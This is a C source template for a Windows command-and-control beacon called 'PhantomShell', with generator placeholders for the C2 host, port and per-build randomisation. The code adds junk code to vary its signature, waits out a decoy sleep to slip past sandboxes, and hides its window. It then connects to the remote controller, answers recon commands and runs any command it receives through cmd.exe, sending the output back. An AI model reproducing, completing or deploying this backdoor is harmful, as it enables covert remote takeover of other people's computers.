/*
 * PhantomShell Native C Beacon
 * Pure Win32 API — no Go runtime, no packer, no overlay.
 * Compiles to ~25KB with MinGW:
 *   gcc -s -O2 -mwindows -o beacon.exe beacon.c -lws2_32 -luser32 -ladvapi32 -lsecur32
 *
 * {{BUILD_ID}}
 * {{RANDOM_MARKER}}
 */

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "secur32.lib")

/* ============================================================
 * CONFIG — replaced by generator at build time
 * ============================================================ */
static const char C2_HOST[] = "{{C2_HOST}}";
static const int  C2_PORT   = {{C2_PORT}};

/* Randomization — unique per build */
static const char  BUILD_MARKER[] = "{{BUILD_MARKER}}";
static const DWORD JUNK_SEED      = {{JUNK_SEED}};
static const DWORD JUNK_LOOP      = {{JUNK_LOOP}};

/* Delay range (seconds) */
static const int DELAY_MIN  = {{DELAY_MIN}};
static const int DELAY_MAX  = {{DELAY_MAX}};

/* ============================================================
 * FORWARD DECLARATIONS
 * ============================================================ */
static void  decoy_sleep(void);
static void  connect_loop(void);
static int   cmd_loop(SOCKET sock);
static int   exec_native(const char *cmd, char *out, int outlen);
static int   exec_shell(const char *cmdline, char *out, int outlen);
static void  log_write(const char *fmt, ...);

/* ============================================================
 * LOGGER
 * ============================================================ */
static char g_logpath[MAX_PATH];

static void log_init(void) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    GetTempPathA(sizeof(g_logpath), g_logpath);
    wsprintfA(g_logpath + lstrlenA(g_logpath),
        "ps_cbeacon_%04d%02d%02d_%02d%02d%02d.log",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

static void log_write(const char *fmt, ...) {
    char line[1024], ts[32];
    SYSTEMTIME st;
    va_list args;
    DWORD written;

    if (!g_logpath[0]) log_init();

    GetLocalTime(&st);
    wsprintfA(ts, "[%02d:%02d:%02d.%03d] ",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    va_start(args, fmt);
    lstrcpyA(line, ts);
    wvsprintfA(line + lstrlenA(line), fmt, args);
    va_end(args);
    lstrcatA(line, "\r\n");

    HANDLE h = CreateFileA(g_logpath, FILE_APPEND_DATA, FILE_SHARE_READ,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        WriteFile(h, line, lstrlenA(line), &written, NULL);
        CloseHandle(h);
    }
}

/* ============================================================
 * RANDOM JUNK (compiled but never called, unique per build)
 * ============================================================ */
static DWORD junk_hash(const char *s) {
    DWORD h = JUNK_SEED ^ 0x{{JUNK_XOR}};
    while (*s) { h = h * 31 + (DWORD)(*s++); }
    return h;
}

static void junk_work(void) {
    volatile DWORD v = JUNK_SEED;
    for (DWORD i = 0; i < JUNK_LOOP; i++) {
        v = v * 1103515245 + 12345;
    }
    volatile DWORD h = junk_hash(BUILD_MARKER);
    (void)h;
}

static const char JUNK_DATA[] = "{{JUNK_DATA}}";

/* ============================================================
 * ENTRY POINT
 * ============================================================ */
int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR cl, int ns) {
    junk_work();
    log_init();
    log_write("PID=%lu Marker=%s C2=%s:%d",
        GetCurrentProcessId(), BUILD_MARKER, C2_HOST, C2_PORT);

    /* Phase 1: decoy delay */
    decoy_sleep();

    /* Phase 2: C2 loop with auto-reconnect */
    connect_loop();

    log_write("Exit");
    return 0;
}

/* ============================================================
 * DECOY SLEEP (3-5 min with harmless API calls)
 * ============================================================ */
static void decoy_sleep(void) {
    DWORD tick = GetTickCount();
    DWORD delay = (DELAY_MIN + (tick % (DELAY_MAX - DELAY_MIN + 1))) * 1000;

    log_write("Sleep %lu seconds", delay / 1000);

    DWORD end = GetTickCount() + delay;
    while (GetTickCount() < end) {
        /* Harmless API calls */
        GetTickCount();
        GetCurrentProcessId();
        GetSystemMetrics(SM_CXSCREEN);
        GetSystemMetrics(SM_CYSCREEN);
        POINT pt;
        GetCursorPos(&pt);
        Sleep(5000 + (GetTickCount() % 5000));
    }
    log_write("Sleep done");
}

/* ============================================================
 * TCP CONNECTION LOOP
 * ============================================================ */
static void connect_loop(void) {
    WSADATA wsa;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        log_write("WSAStartup failed");
        return;
    }

    while (1) {
        log_write("Connecting to %s:%d ...", C2_HOST, C2_PORT);

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            log_write("socket() failed: %d", WSAGetLastError());
            Sleep(30000);
            continue;
        }

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)C2_PORT);
        addr.sin_addr.s_addr = inet_addr(C2_HOST);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
            log_write("connect() failed: %d", WSAGetLastError());
            closesocket(sock);
            Sleep(30000);
            continue;
        }

        log_write("TCP connected");
        cmd_loop(sock);
        closesocket(sock);
        log_write("Disconnected — reconnect in 30s");
        Sleep(30000);
    }
}

/* ============================================================
 * COMMAND LOOP (C2 protocol)
 * ============================================================ */
static int cmd_loop(SOCKET sock) {
    char buf[65536];
    char out[65536];
    char response[131072];
    int n;

    /* Set recv timeout to 5 min */
    DWORD timeout = 300000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

    while (1) {
        n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) return -1;
        buf[n] = 0;

        /* Trim trailing \r\n */
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = 0;

        if (n == 0) continue;

        log_write("CMD: %s", buf);

        /* ── Dispatch ──────────────────────────── */
        int handled = exec_native(buf, out, sizeof(out));

        if (!handled) {
            /* Not a built-in command — spawn cmd.exe */
            log_write("  → cmd.exe /c %s", buf);
            exec_shell(buf, out, sizeof(out));
        }

        /* ── Send response with PS> terminator ─── */
        wsprintfA(response, "%s\nPS> ", out);
        send(sock, response, lstrlenA(response), 0);
    }
}

/* ============================================================
 * NATIVE COMMAND HANDLERS (no cmd.exe spawn)
 * Returns 1 if handled, 0 if not
 * ============================================================ */
static int exec_native(const char *cmd, char *out, int outlen) {
    /* echo alive */
    if (lstrcmpA(cmd, "echo alive") == 0) {
        lstrcpyA(out, "alive");
        log_write("  → native: echo alive");
        return 1;
    }

    /* hostname */
    if (lstrcmpA(cmd, "hostname") == 0) {
        DWORD sz = outlen;
        if (GetComputerNameA(out, &sz)) {
            log_write("  → native: hostname = %s", out);
        } else {
            lstrcpyA(out, "unknown");
        }
        return 1;
    }

    /* whoami */
    if (lstrcmpA(cmd, "whoami") == 0) {
        DWORD sz = outlen;
        if (GetUserNameA(out, &sz)) {
            log_write("  → native: whoami = %s", out);
        } else {
            /* Fallback: GetUserNameEx */
            typedef BOOLEAN (WINAPI *GetUserNameExWFn)(int, LPWSTR, PULONG);
            HMODULE secur32 = LoadLibraryA("secur32.dll");
            if (secur32) {
                GetUserNameExWFn fn = (GetUserNameExWFn)GetProcAddress(secur32, "GetUserNameExW");
                if (fn) {
                    WCHAR wbuf[256];
                    ULONG wlen = 256;
                    if (fn(2, wbuf, &wlen)) { /* NameSamCompatible */
                        WideCharToMultiByte(CP_ACP, 0, wbuf, -1, out, outlen, NULL, NULL);
                    }
                }
                FreeLibrary(secur32);
            }
        }
        if (out[0] == 0) lstrcpyA(out, "unknown");
        return 1;
    }

    /* OS version */
    if (strstr(cmd, "OSVersion") || strstr(cmd, "VersionString") ||
        strstr(cmd, "Environment")) {

        /* Try registry: ProductName */
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = outlen, type;
            if (RegQueryValueExA(hKey, "ProductName", NULL, &type,
                (LPBYTE)out, &sz) == ERROR_SUCCESS && type == REG_SZ) {
                RegCloseKey(hKey);
                log_write("  → native: OS = %s", out);
                return 1;
            }
            RegCloseKey(hKey);
        }

        /* Fallback: GetVersionEx */
        OSVERSIONINFOA vi = { sizeof(vi) };
        if (GetVersionExA(&vi)) {
            wsprintfA(out, "Windows %lu.%lu (Build %lu)",
                vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
        } else {
            lstrcpyA(out, "Windows (unknown version)");
        }
        log_write("  → native: OS = %s", out);
        return 1;
    }

    /* Exit / quit (C2 might send these) */
    if (lstrcmpiA(cmd, "exit") == 0 || lstrcmpiA(cmd, "quit") == 0) {
        lstrcpyA(out, "bye");
        return 1;
    }

    return 0; /* not handled — caller will spawn cmd.exe */
}

/* ============================================================
 * SHELL COMMAND EXECUTION (cmd.exe /c)
 * ============================================================ */
static int exec_shell(const char *cmdline, char *out, int outlen) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = { sizeof(si) };

    out[0] = 0;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        wsprintfA(out, "[pipe error: %lu]", GetLastError());
        return -1;
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    char cmd[MAX_PATH + 10];
    wsprintfA(cmd, "cmd.exe /c %s", cmdline);

    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hWrite);

    if (!ok) {
        wsprintfA(out, "[proc error: %lu]", GetLastError());
        CloseHandle(hRead);
        return -1;
    }

    /* Read output */
    char tmp[4096];
    DWORD total = 0, read;
    while (ReadFile(hRead, tmp, sizeof(tmp) - 1, &read, NULL) && read > 0) {
        if (total + read < (DWORD)outlen - 1) {
            CopyMemory(out + total, tmp, read);
            total += read;
            out[total] = 0;
        } else {
            break;
        }
    }

    /* Wait for process */
    WaitForSingleObject(pi.hProcess, 30000);

    /* Get exit code */
    DWORD ec;
    GetExitCodeProcess(pi.hProcess, &ec);

    /* Trim trailing whitespace */
    while (total > 0 && (out[total - 1] == '\r' || out[total - 1] == '\n' ||
           out[total - 1] == ' '))
        out[--total] = 0;

    if (ec != 0) {
        wsprintfA(out + total, "\n[err: exit %lu]", ec);
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
